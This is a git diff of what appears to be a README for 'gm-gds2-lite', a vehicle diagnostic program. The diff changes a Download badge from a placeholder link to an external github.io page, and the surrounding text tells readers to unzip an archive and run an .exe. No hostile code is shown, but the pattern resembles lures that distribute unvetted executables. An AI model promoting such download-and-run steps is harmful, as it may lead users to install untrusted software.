@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://gm-gds2-lite.github.io/.github/)
 
 ## 📸 Overview
  ![gm-gds2-lite-faultcodes](https://github.com/user-attachments/assets/598765b6-57de-439d-999f-71a57e728dd4)
